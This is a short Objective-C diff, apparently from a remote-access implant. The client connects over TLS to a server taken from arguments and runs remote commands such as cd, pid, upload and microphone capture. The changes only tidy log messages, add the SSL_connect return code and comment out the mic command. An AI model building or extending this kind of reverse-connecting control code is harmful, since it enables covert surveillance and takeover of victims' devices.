@@ -85,22 +85,23 @@ void connectToServer(NSDictionary* arguments) {
             &serverAddress.sin_addr);
   serverAddress.sin_port =
       htons([[arguments objectForKey:@"port"] integerValue]);
-  NSLog(@"%s", "Connecting...\n");
+  NSLog(@"Connecting...");
   if (connect(sockfd, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) <
       0) {
-    NSLog(@"%s", "connection failed\n");
+    NSLog(@"Connection failed");
     return;
   } else {
-    NSLog(@"%s", "connection successfull\n");
+    NSLog(@"Connection successfull");
   }
   client_ssl = SSL_new(ssl_client_ctx);
   if (!client_ssl) {
-    NSLog(@"Client Failed\n");
+    NSLog(@"Client Failed");
     return;
   }
+  int ssl_connect_ret;
   SSL_set_fd(client_ssl, sockfd);
-  if (SSL_connect(client_ssl) < 0) {
-    NSLog(@"Handshake Failed\n");
+  if ((ssl_connect_ret = SSL_connect(client_ssl)) < 0) {
+    NSLog(@"Handshake Failed\t(%d)\n", ssl_connect_ret);
     return;
   }
 
@@ -153,7 +154,7 @@ void interact(NSDictionary* arguments) {
     } else if ([cmd isEqualToString:@"cd"]) {
       [esCommand changeDirectory:args];
     } else if ([cmd isEqualToString:@"mic"]) {
-      [esCommand mic:args];
+      // [esCommand mic:args];
     } else if ([cmd isEqualToString:@"pid"]) {
       [esCommand getProcessId];
     } else if ([cmd isEqualToString:@"upload"]) {
